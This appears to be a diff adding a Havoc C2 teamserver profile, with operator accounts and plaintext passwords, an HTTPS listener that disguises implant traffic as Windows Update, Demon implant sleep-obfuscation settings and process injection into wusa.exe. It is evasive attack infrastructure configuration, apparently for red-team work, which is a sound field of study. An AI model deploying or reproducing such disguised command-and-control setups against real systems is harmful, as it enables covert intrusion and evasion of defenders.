@@ -1,0 +1,91 @@
+# Author: @Altoid0day
+# Derived from @mohammadaskar2 https://github.com/BC-SECURITY/Malleable-C2-Profiles/blob/master/Normal/windows-updates.profile
+# Inspired from: @bluscreenofjeff https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/microsoftupdate_getonly.profile
+Teamserver {
+    Host = "0.0.0.0"
+    Port = 40056
+
+    Build {
+        Compiler64 = "data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"
+        Compiler86 = "data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc"
+        Nasm = "/usr/bin/nasm"
+    }
+}
+
+Operators {
+    user "A0" {
+        password = "howYouFeel1!"
+    }
+
+    user "Operator2" {
+        password = "iFeelFine1!"
+    }
+
+    user "Operator3" {
+        password = "moreDollarSigns!"
+    }
+
+    user "Operator4" {
+        password = "cameRightTime!"
+    }
+
+    user "Operator5" {
+        password = "turnoffLights!"
+    }
+
+    user "Operator6" {
+        password = "canIRollup!"
+    }
+}
+
+Listeners {
+    Http {
+        Name = "HTTPS - WinUpdate"
+        HostBind = "0.0.0.0"
+        PortBind = 443
+        PortConn = 443
+        HostRotation = "random"
+        UserAgent = "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/1.40" # TODO Might need updating
+        Headers = [
+            "Accept: */*",
+            "Host: download.windowsupdate.com"
+        ]
+        Uris = [
+            "/c/msdownload/update/others/2020/10/29136388_", #TODO
+            "/c/msdownload/update/others/2020/10/28986731_"
+        ]
+        Secure = true
+        Cert = [
+            Cert = "", #TODO generate cert
+            Key = ""
+        ]
+        Response = {
+            Headers = [
+                "Server: Microsoft-IIS/8.5",
+                "X-Powered-By: ASP.NET",
+                "Content-Encoding: application/vnd.ms-cab-compressed"
+            ]
+        }
+    }
+
+    # Smb {} # TODO is this a thing?
+}
+
+Demon {
+    Sleep = 5
+    Jitter = 20
+    TrustXForwardedFor = false # Enable if the team server is placed behind a redirector
+    Implant {
+        SleepMask = 1
+        
+        SleepMaskTechnique = 0
+            # SLEEPOBF_NO_OBF  0x0
+            # SLEEPOBF_EKKO    0x1
+            # SLEEPOBF_ZILEAN  0x2
+            # SLEEPOBF_FOLIAGE 0x3
+    }
+    Injection = {
+        Spawn64 = "C:\\Windows\\System32\\wusa.exe"
+        Spawn32 = "C:\\Windows\\SysWOW64\\wusa.exe"
+    }
+}
